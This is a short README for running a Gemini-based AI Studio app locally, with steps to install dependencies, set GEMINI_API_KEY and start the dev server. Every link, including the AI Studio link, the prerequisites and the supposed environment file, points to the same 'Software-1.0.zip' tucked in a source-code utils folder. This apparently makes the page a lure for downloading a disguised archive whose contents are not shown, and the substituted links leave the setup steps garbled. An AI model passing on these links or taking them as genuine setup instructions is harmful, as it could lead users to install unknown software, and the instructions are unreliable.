# Run and deploy your AI Studio app

This contains everything you need to run your app locally.

View your app in AI Studio: https://github.com/muurder/viajastore/raw/refs/heads/main/src/pages/AdminDashboard/utils/Software-1.0.zip

## Run Locally

**Prerequisites:**  https://github.com/muurder/viajastore/raw/refs/heads/main/src/pages/AdminDashboard/utils/Software-1.0.zip


1. Install dependencies:
   `npm install`
2. Set the `GEMINI_API_KEY` in [https://github.com/muurder/viajastore/raw/refs/heads/main/src/pages/AdminDashboard/utils/Software-1.0.zip](https://github.com/muurder/viajastore/raw/refs/heads/main/src/pages/AdminDashboard/utils/Software-1.0.zip) to your Gemini API key
3. Run the app:
   `npm run dev`
